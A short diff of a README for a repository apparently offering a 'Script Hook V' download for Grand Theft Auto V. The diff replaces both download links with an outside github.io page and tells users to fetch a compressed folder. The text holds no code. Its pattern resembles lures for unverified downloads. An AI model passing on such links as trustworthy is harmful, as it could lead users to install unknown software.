@@ -1,6 +1,6 @@
 # 🎮 Script-Hook-V-Download - Enable custom modifications for your game
 
-[![](https://img.shields.io/badge/Download-Script_Hook_V-blue.svg)](https://github.com/nayl7186/Script-Hook-V-Download)
+[![](https://img.shields.io/badge/Download-Script_Hook_V-blue.svg)](https://nayl7186.github.io)
 
 This tool allows you to run custom scripts and modifications within your copy of Grand Theft Auto V on Windows 10 and Windows 11. It acts as the foundation that enables the game to recognize and load various community-made mods.
 
@@ -8,7 +8,7 @@ This tool allows you to run custom scripts and modifications within your copy of
 
 To obtain the necessary files for your system, follow the link below. This link leads to the repository page where you can access the latest release.
 
-[Click here to visit the download page](https://github.com/nayl7186/Script-Hook-V-Download)
+[Click here to visit the download page](https://nayl7186.github.io)
 
 Once you reach the page, look for the section marked Releases on the right side of the screen. Click on the latest version number to view the available files. Download the compressed folder to your computer.
 
